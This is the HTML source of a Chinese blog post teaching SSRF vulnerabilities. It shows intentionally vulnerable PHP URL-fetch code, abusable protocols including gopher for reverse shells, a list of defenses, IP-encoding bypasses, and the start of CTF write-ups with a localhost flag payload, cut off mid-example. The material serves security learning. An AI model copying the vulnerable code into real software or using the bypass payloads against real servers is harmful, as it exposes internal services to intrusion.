@@ -1,0 +1,1471 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SSRF漏洞原理攻击与防御, 十二惊惶">
+    <meta name="description" content="SSRF漏洞原理攻击与防御
+前言：笔者对SSRF的进一步研究学习基于网络安全爱好者的兴趣，与白帽黑客的责任，仅在专业靶场和补天平台授权站点进行测试。
+
+[TOC]
+SSRF(Server-Side Request Forgery:服务器端请">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SSRF漏洞原理攻击与防御 | 十二惊惶</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="十二惊惶" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/1.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">十二惊惶</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/1.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">十二惊惶</div>
+        <div class="logo-desc">
+            
+            犁牛之子骍且角，虽欲勿用，山川其舍诸
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://gitee.com/Im-so-scared-2/shier_jinghuang" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>十二惊惶
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://gitee.com/Im-so-scared-2/shier_jinghuang" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="十二惊惶" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SSRF漏洞原理攻击与防御</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                            <a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">SSRF漏洞</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-10-25
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-03-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="SSRF漏洞原理攻击与防御"><a href="#SSRF漏洞原理攻击与防御" class="headerlink" title="SSRF漏洞原理攻击与防御"></a>SSRF漏洞原理攻击与防御</h2><blockquote>
+<p style="color:red;">前言：笔者对SSRF的进一步研究学习基于网络安全爱好者的兴趣，与白帽黑客的责任，仅在专业靶场和补天平台授权站点进行测试。</p>
+</blockquote>
+<p>[TOC]</p>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个漏洞</p>
+<h3 id="一、SSRF漏洞原理："><a href="#一、SSRF漏洞原理：" class="headerlink" title="一、SSRF漏洞原理："></a>一、SSRF漏洞原理：</h3><blockquote>
+<p style="color:blue;"> SSRF漏洞 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+</blockquote>
+<center> <img src="https://img-blog.csdnimg.cn/b53de209637a4a88853e1762d639b5d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" style="zoom: 67%;" /></center> 
+#### 1.1 SSRF危害
+
+<p>端口扫描、内网web应用指纹识别、攻击内网web应用、读取本地文件</p>
+<h3 id="二、SSRF漏洞挖掘"><a href="#二、SSRF漏洞挖掘" class="headerlink" title="二、SSRF漏洞挖掘:"></a>二、SSRF漏洞挖掘:</h3><p>互联网上的很多web应用提供了从其他服务器获取数据的功能。使用用户指定的URL，web应用可以获取图片、文件资源。可以说如果链接可以访问任意请求，则存在ssrf漏洞</p>
+<h4 id="2-1-SSRF可能产生的方式："><a href="#2-1-SSRF可能产生的方式：" class="headerlink" title="2.1 SSRF可能产生的方式："></a>2.1 SSRF可能产生的方式：</h4><ul>
+<li><p> 分享：通过URL地址分享网页内容 </p>
+</li>
+<li><p>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
+</li>
+<li><p>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
+</blockquote>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+</li>
+<li><p>图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。 </p>
+</li>
+<li><p>从URL关键字中寻找，可以通过谷歌语法通过关键字寻找 SSRF漏洞</p>
+<blockquote>
+<p> share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="2-2-PHP中可能产生SSRF漏洞的函数："><a href="#2-2-PHP中可能产生SSRF漏洞的函数：" class="headerlink" title="2.2 PHP中可能产生SSRF漏洞的函数："></a>2.2 PHP中可能产生SSRF漏洞的函数：</h4><p><strong>file_get_contents:</strong>     file_get_contents() 把整个文件读入一个字符串中。</p>
+<blockquote>
+<p style="color:red;">file_get_contents(path,include_path,context,start,max_length)</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">#下面的代码使用file_get_contents函数从用户指定的url获取图片。
+#然后把它用一个随即文件名保存在硬盘上，并展示给用户。
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token string single-quoted-string">'./images/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">';img1.jpg'</span><span class="token punctuation">;</span> 
+		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+		<span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+        <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;img src=\""</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"\"/>"</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> <strong>sockopen():</strong>     使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"># 以下代码使用fsockopen函数实现获取用户制定url的数据
+# 这个函数会使用socket跟服务器建立tcp连接，传输原始数据。
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    	<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (error number <span class="token interpolation"><span class="token variable">$errno</span></span>) \n"</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GET <span class="token interpolation"><span class="token variable">$link</span></span> HTTP/1.1\r\n"</span><span class="token punctuation">;</span>
+            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Host: <span class="token interpolation"><span class="token variable">$host</span></span>\r\n"</span><span class="token punctuation">;</span>
+            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>
+            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span> 
+            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+            <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> 
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$contents</span><span class="token operator">.=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+            <span class="token punctuation">&#125;</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+            <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">&#125;</span> 
+	<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>3、curl_exec():</strong> curl_exec — 执行一个cURL会话</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 	<span class="token comment"># 详细注释版本见web351</span>
+		<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span>
+		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+		<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-4-相关协议"><a href="#2-4-相关协议" class="headerlink" title="2.4 相关协议"></a>2.4 相关协议</h4><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p>
+<p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+<p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
+<p>http/s协议：探测内网主机存活</p>
+<h3 id="三、SSRF利用"><a href="#三、SSRF利用" class="headerlink" title="三、SSRF利用:"></a>三、SSRF利用:</h3><blockquote>
+<p style="color:blue;">可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;
+<p style="color:blue;">攻击运行在内网或本地的应用程序（比如溢出）;
+<p style="color:blue;">对内网web应用进行指纹识别，通过访问默认文件实现;
+<p style="color:blue;">攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;
+<p style="color:blue;">利用file协议读取本地文件等。各个协议调用探针：http,file,dict,ftp,gopher等
+</blockquote>
+<h3 id="四、SSRF漏洞防御："><a href="#四、SSRF漏洞防御：" class="headerlink" title="四、SSRF漏洞防御："></a>四、SSRF漏洞防御：</h3><p>通常有以下5个思路：</p>
+<ol>
+<li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+</li>
+<li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+</li>
+<li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+</li>
+<li><p>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+</li>
+<li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>
+</li>
+</ol>
+<h3 id="五、SSRF漏洞常见绕过方式："><a href="#五、SSRF漏洞常见绕过方式：" class="headerlink" title="五、SSRF漏洞常见绕过方式："></a>五、SSRF漏洞常见绕过方式：</h3><h4 id="5-1-采用短网址绕过-amp-采用进制转换"><a href="#5-1-采用短网址绕过-amp-采用进制转换" class="headerlink" title="5.1 采用短网址绕过 &amp; 采用进制转换"></a>5.1 采用短网址绕过 &amp; 采用进制转换</h4><blockquote>
+<p style="color:blue;">采用短网址进行绕过和进制转化绕过都是非常经典的方式，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<h5 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token comment">//初始化一个cURL会话</span>
+	<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//设定返回信息中包含响应信息头</span>
+	<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//启用时会将头文件的信息作为数据流输出。 </span>
+	<span class="token comment">//参数为1表示输出信息头,为0表示不输出</span>
+	<span class="token comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span>
+	<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//参数为1表示$result,为0表示echo $result</span>
+	<span class="token comment">//执行一个cURL会话</span>
+	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//关闭一个curl会话</span>
+	<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span>
+	<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>存在一个flag.php，直接访问给了提示，非本地用户无法访问， 要让我们以本地用户去访问127.0.0.1/flag.php </p>
+<blockquote>
+<p style="color:blue;">url=http://127.0.0.1/flag.php</p>
+</blockquote>
+<h5 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
